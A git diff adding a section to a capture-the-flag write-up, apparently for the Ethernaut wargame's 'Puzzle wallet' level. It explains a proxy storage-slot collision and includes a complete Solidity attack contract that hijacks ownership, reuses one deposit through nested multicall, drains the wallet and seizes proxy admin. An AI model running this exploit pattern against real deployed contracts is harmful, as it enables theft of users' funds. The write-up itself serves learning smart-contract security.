@@ -384,3 +384,54 @@ fallback() external payable {
 # 23. Puzzle wallet
 * The thing we have to look for while using proxy here is the state storage.
 * Here the implimentation contract uses the memory of logic contract and they are not assigned properly so we can take advantage of that.
+```
+// These are the 2 storage slots which are assigned wrong.
+// Changing pendingAdmin in PuzzleProxy makes us the owner of PuzzleWallet.
+
+contract PuzzleProxy is UpgradeableProxy {
+    address public pendingAdmin;
+    address public admin;
+    
+contract PuzzleWallet {
+    address public owner;
+    uint256 public maxBalance;
+```
+* After being the owner of PuzzleWallet we can get into the whitelist and change the maxBalance and become the admin of PuzzleProxy.
+* But there is an caveat changing the maxBalance we need to make the balance of the address to 0 for that to we need to deposit some ether to the contract and get all of the balance out.
+* To take the balance out we can take advantage of multicall() and Delegate call by coupling 2 deposits with only ether for one deposit.
+```
+interface IWallet {
+    function proposeNewAdmin(address _newAdmin) external;
+    function addToWhitelist(address addr) external;
+    function deposit() external payable;
+    function multicall(bytes[] calldata data) external payable;
+    function execute(address to, uint256 value, bytes calldata data) external payable;
+    function setMaxBalance(uint256 _maxBalance) external;
+}
+
+contract Hack {
+    constructor(IWallet wallet) payable {
+        // overwrite wallet owner
+        wallet.proposeNewAdmin(address(this));
+        wallet.addToWhitelist(address(this));
+
+        bytes[] memory deposit_data = new bytes[](1);
+        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);
+
+        bytes[] memory data = new bytes[](2);
+        // deposit
+        data[0] = deposit_data[0];
+        // multicall -> deposit
+        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
+        wallet.multicall{value: 0.001 ether}(data);
+
+        // withdraw
+        wallet.execute(msg.sender, 0.002 ether, "");
+
+        // set admin
+        wallet.setMaxBalance(uint256(uint160(msg.sender)));
+     }
+```
+
+# 24. Motorbike
+
